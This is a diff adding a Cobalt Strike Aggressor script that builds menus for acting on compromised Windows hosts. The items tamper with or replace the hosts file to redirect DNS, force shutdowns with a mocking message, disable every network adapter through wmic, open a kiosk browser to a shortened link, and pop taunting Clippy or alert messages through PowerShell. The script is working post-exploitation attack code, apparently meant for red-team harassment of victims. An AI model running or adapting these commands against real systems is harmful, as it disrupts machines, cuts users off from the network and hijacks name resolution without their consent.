@@ -1,0 +1,69 @@
+#################################################
+# Created by @jgaudard  :: I don't twitter much
+# Aggressor script with various attacks
+# Created: 3 March 2017 Modified: 28 Mar 2017
+# Version 1.0
+#
+# References: 
+# https://github.com/bluscreenofjeff
+########################################
+
+
+popup beacon_bottom {
+    menu "Deny" {
+        item "Add Host File Entry" {
+            prompt_text("Specify an entry to add to the host file:", "127.0.0.1 google.com", lambda({
+                bshell(@ids, 'echo ' . $1 . ' >> c:\\windows\\System32\\Drivers\\Etc\Hosts');
+                blog(@ids,"Adding the following entry to the host file: $1 ");
+                bshell(@ids, "ipconfig /flushdns");
+            }, @ids => $1));
+        }
+		item "Replace Host File" {
+			prompt_file_open("Choose a file to replace the current host file:", "hosts.txt", false, lambda({
+				bcd(@ids,"c:\\windows\\system32\\drivers\\etc");
+				brm(@ids,"hosts");
+				blog(@ids,"Uploading file $1 to c:\\windows\\system32\\drivers\\etc\\hosts");
+				bupload(@ids,$1);
+				bshell(@ids, "ipconfig /flushdns");
+				blog(@ids,"File uploaded and DNS flushed. Done!");
+			}, @ids => $1));
+		}
+        item "Shutdown Host" {
+            prompt_confirm("Are you SURE you want to bounce the box(es)?", "Confirm", lambda({
+                blog(@ids,"shutting down");
+                bshell(@ids, "shutdown /s /f /t 5 /c 'Uh uh uh! You didn't say the magic word! Uh uh uh! Uh uh uh!' -d up:125:1");
+            }, @ids => $1));
+        }
+        item "Disable Network" {
+            prompt_confirm("Are you SURE you want to disable all network interfaces?", "Confirm", lambda({
+                bshell(@ids,"wmic path win32_networkadapter where netenabled='TRUE' call disable");
+                blog(@ids,"Disabling network interfaces!");
+            }, @ids => $1));
+        }        
+	}
+  	menu "Lulz" {
+        item "IE Kiosk Popup" {  ## defaults to mcdonalds job, recommend url shortening
+            prompt_text("What site do you want to pop up?", "bit.ly/2noJ1YP", lambda({
+                binput(@ids,"C:\\Progra~1\\Intern~1\\iexplore.exe -k $1");
+                bshell(@ids, "C:\\Progra~1\\Intern~1\\iexplore.exe -k $1");
+            }, @ids => $1));
+        }
+		item "Clippy" {
+			#BE SURE TO RUN SET UP STEPS
+			#based on this blog post: https://mellowtigger.dreamwidth.org/250130.html
+			#
+			prompt_text("What should Clippy say?", "Try Harder", lambda({
+				$text = '$MI6 = new-object -com agent.control.2; $MI6.connected = $true; $MI6.characters.load("Clippy","Clippit.acs"); $agent = $MI6.characters.character("Clippy"); $agent.moveto(800,400); $agent.Show(); $agent.Play("Wave"); $agent.think(" ' . $1 . ' "); $agent.Play("Wave"); Start-Sleep -s 4; $agent.Play("Wave"); $agent.hide(); while ($agent.visible) { sleep -Milliseconds 100 }; $MI6.characters.unload("Clippy");';
+				binput(@ids,"$text");
+				bpowershell(@ids, "$text");
+				blog(@ids,"Clippy finished helping out.")
+			}, @ids => $1));
+		}
+		item "Windows Alert (Win 7+)" {
+			prompt_text("What should the alert say?", "Try Harder", lambda({
+				bpowershell(@ids, 'Add-Type -AssemblyName Microsoft.VisualBasic; [Microsoft.VisualBasic.Interaction]::MsgBox("' . $1 . '", "OKOnly,MsgBoxSetForeground,SystemModal,Exclamation", "")' );
+				blog(@ids,"Creating an alert box with the following message: $1 ");
+			}, @ids => $1));
+		}        
+    }
+}
